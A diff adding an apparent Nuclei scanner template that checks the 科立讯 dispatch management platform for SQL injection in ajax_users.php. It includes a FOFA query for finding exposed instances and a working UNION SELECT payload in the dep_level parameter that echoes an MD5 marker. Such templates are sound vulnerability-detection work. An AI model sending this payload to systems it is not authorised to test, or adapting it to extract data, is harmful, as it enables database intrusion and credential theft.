@@ -1,0 +1,36 @@
+id: kelixun-ajax_users-sql-injection
+
+info:
+  name: "科立讯通信指挥调度管理平台 ajax_users.php SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="指挥调度管理平台"
+    该漏洞允许攻击者通过构造恶意SQL查询，绕过输入验证机制，执行未经授权的数据库操作。成功利用可导致敏感数据泄露（如管理员凭证、用户隐私信息），并在具备足够权限的情况下，通过写入恶意脚本实现对服务器的持久化控制。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140082476
+  tags: 科立讯通信指挥调度管理平台
+
+http:
+- raw:
+  - |
+    POST /app/ext/ajax_users.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(123123),0x7e),NULL,NULL,NULL-- -
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '~4297f44b13955235245b2497399d7a93~'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
